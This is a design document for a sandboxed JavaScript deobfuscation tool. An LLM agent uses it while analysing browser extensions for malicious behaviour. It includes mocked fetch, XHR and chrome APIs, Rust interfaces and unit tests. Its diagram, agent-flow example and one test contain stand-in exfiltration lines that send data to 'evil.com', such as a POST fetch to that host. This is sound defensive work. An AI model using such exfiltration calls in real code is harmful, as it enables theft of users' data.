# Sandboxed Deobfuscation Tool - Design Document

**Date:** 2026-01-19
**Status:** Approved

## Overview

A new LLM tool that executes JavaScript snippets in a WebAssembly-based sandbox to reveal what obfuscated code actually does. The LLM agent can call this tool when it encounters suspicious patterns during analysis.

### Goals

- Decode obfuscated strings (`String.fromCharCode`, `atob`, hex-encoded)
- Trace what APIs the code attempts to call (`fetch`, `chrome.*`, etc.)
- Run in complete isolation (no network, no filesystem access)
- Integrate as an LLM agent tool call

### Non-Goals

- Full browser environment simulation
- Mock responses that allow continued execution flow
- Dynamic analysis of entire extension bundles

---

## Architecture

```
┌─────────────────────────────────────────────────────────┐
│  LLM Agent                                              │
│  ┌─────────────────────────────────────────────────┐   │
│  │ "I see String.fromCharCode - let me decode it"  │   │
│  └─────────────────┬───────────────────────────────┘   │
│                    │ tool call                          │
│                    ▼                                    │
│  ┌─────────────────────────────────────────────────┐   │
│  │ DeobfuscateTool { snippet: "String.from..." }   │   │
│  └─────────────────┬───────────────────────────────┘   │
└────────────────────┼────────────────────────────────────┘
                     │
                     ▼
┌─────────────────────────────────────────────────────────┐
│  Sandbox Runtime (QuickJS-WASM)                         │
│  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐     │
│  │ JS Engine   │  │ API Mocks   │  │ Call Tracer │     │
│  │ (QuickJS)   │  │ fetch,chrome│  │ logs calls  │     │
│  └─────────────┘  └─────────────┘  └─────────────┘     │
└─────────────────────┬───────────────────────────────────┘
                      │
                      ▼
        { decoded: "https://evil.com", calls: [...] }
```

### Key Properties

- **Isolated**: WASM cannot access filesystem, network, or environment
- **Deterministic**: Same input always produces same output
- **Fast**: QuickJS is lightweight, sub-millisecond for small snippets
- **Portable**: No Docker, no external runtime needed

---

## API Mocking & Call Tracing

The sandbox injects mock browser APIs that log attempts without executing real operations.

### Mocked Globals

```javascript
const _trace = { decoded: [], calls: [] };

// Decoding functions - execute normally, log results
const _origAtob = atob;
globalThis.atob = (s) => {
  const result = _origAtob(s);
  _trace.decoded.push({ fn: "atob", input: s, output: result });
  return result;
};

// Browser APIs - log the attempt, return empty/undefined
globalThis.chrome = createTracingProxy("chrome");
globalThis.browser = createTracingProxy("browser");
globalThis.fetch = (url, opts) => {
  _trace.calls.push({ fn: "fetch", args: [url, opts] });
  return Promise.resolve({ ok: false });
};

globalThis.XMLHttpRequest = class {
  open(method, url) { _trace.calls.push({ fn: "xhr.open", args: [method, url] }); }
  send(body) { _trace.calls.push({ fn: "xhr.send", args: [body] }); }
};
```

### Traced Functions

| Category | Functions | Output |
|----------|-----------|--------|
| Decoding | `atob`, `String.fromCharCode`, hex unescape | Input → decoded output |
| Network | `fetch`, `XMLHttpRequest` | URL, method, body |
| Browser APIs | `chrome.*`, `browser.*` | Full call path + arguments |
| DOM (limited) | `document.cookie`, `localStorage` | Access attempts |

Proxy-based tracing for `chrome.*` catches any nested property access without explicitly mocking every API.

---

## Rust Interface

### Module Structure

```
src/
├── sandbox/
│   ├── mod.rs          # Public API: execute_snippet()
│   ├── runtime.rs      # QuickJS-WASM initialization
│   ├── mocks.rs        # Injected API mocks (embedded as const)
│   └── trace.rs        # Parse trace results from JS
```

### Public API

```rust
// src/sandbox/mod.rs

pub struct SandboxResult {
    pub decoded_strings: Vec<DecodedString>,
    pub api_calls: Vec<ApiCall>,
    pub final_value: Option<String>,  // Result of last expression
    pub error: Option<String>,        // If execution failed
}

pub struct DecodedString {
    pub function: String,    // "atob", "fromCharCode", etc.
    pub input: String,       // The encoded input
    pub output: String,      // The decoded result
}

pub struct ApiCall {
    pub function: String,    // "fetch", "chrome.cookies.getAll"
    pub arguments: Vec<serde_json::Value>,
}

/// Execute a JS snippet in the sandbox with timeout
pub fn execute_snippet(code: &str, timeout_ms: u64) -> SandboxResult;
```

### Dependency

```bash
cargo add rquickjs --features bindgen,parallel
```

---

## LLM Agent Integration

### New Task Variant

```rust
// src/llm/agents.rs

pub enum AnalysisTask {
    ManifestReview,
    ScriptAnalysis,
    EndpointAnalysis,
    FinalSummary,
    Deobfuscate(String),  // NEW: code snippet to decode
}
```

### Tool Definition

```rust
Tool {
    name: "deobfuscate",
    description: "Execute obfuscated JavaScript in a sandbox to reveal what it does.
                  Use when you see String.fromCharCode, atob, hex-encoded strings,
                  or other obfuscation patterns.",
    parameters: {
        "snippet": {
            "type": "string",
            "description": "The JavaScript code to deobfuscate"
        }
    }
}
```

### Agent Flow

1. ScriptAnalysis agent receives file with obfuscated code
2. Agent recognizes `String.fromCharCode(104,116,116,112...)` pattern
3. Agent calls `deobfuscate` tool with that snippet
4. Sandbox returns `{ decoded: ["http://evil.com/steal"], calls: [] }`
5. Agent incorporates decoded URL into its analysis

---

## Error Handling & Timeouts

### Timeout Configuration

Default: 1000ms (1 second) - enough for decoding, catches infinite loops.

### Error Scenarios

| Scenario | Behavior | Example `error` field |
|----------|----------|----------------------|
| Syntax error | Return immediately with parse error | `"SyntaxError: Unexpected token at line 3"` |
| Timeout | Kill execution, return partial trace | `"Timeout after 1000ms (possible infinite loop)"` |
| Reference error | Continue if possible, note error | `"ReferenceError: unknownVar is not defined"` |
| Unimplemented API | Log the call attempt, continue | `null` (not an error, just traced) |

### Partial Results Example

```rust
// Code: atob("aGVsbG8="); while(true) {}
SandboxResult {
    decoded_strings: vec![
        DecodedString { function: "atob", input: "aGVsbG8=", output: "hello" }
    ],
    api_calls: vec![],
    final_value: None,
    error: Some("Timeout after 1000ms (possible infinite loop)".into()),
}
```

---

## Implementation Plan

### New Files

| File | Purpose |
|------|---------|
| `src/sandbox/mod.rs` | Public API, `execute_snippet()` |
| `src/sandbox/runtime.rs` | QuickJS initialization, timeout handling |
| `src/sandbox/mocks.rs` | JavaScript mock code as embedded string |
| `src/sandbox/trace.rs` | `SandboxResult`, `DecodedString`, `ApiCall` types |

### Modified Files

| File | Changes |
|------|---------|
| `src/lib.rs` | Add `pub mod sandbox;` |
| `src/llm/agents.rs` | Add `Deobfuscate` task variant, tool definition |
| `src/llm/provider.rs` | Handle deobfuscate tool calls from LLM |

### Tests

```rust
#[cfg(test)]
mod tests {
    #[test]
    fn test_atob_decoding() {
        let result = execute_snippet("atob('aGVsbG8=')", 1000);
        assert_eq!(result.decoded_strings[0].output, "hello");
    }

    #[test]
    fn test_fromcharcode_decoding() {
        let result = execute_snippet("String.fromCharCode(72,101,108,108,111)", 1000);
        assert_eq!(result.final_value, Some("Hello".into()));
    }

    #[test]
    fn test_timeout_with_partial() {
        let result = execute_snippet("atob('dGVzdA=='); while(true){}", 100);
        assert!(result.error.is_some());
        assert_eq!(result.decoded_strings.len(), 1);
    }

    #[test]
    fn test_fetch_tracing() {
        let result = execute_snippet("fetch('https://evil.com', {method:'POST'})", 1000);
        assert_eq!(result.api_calls[0].function, "fetch");
    }
}
```
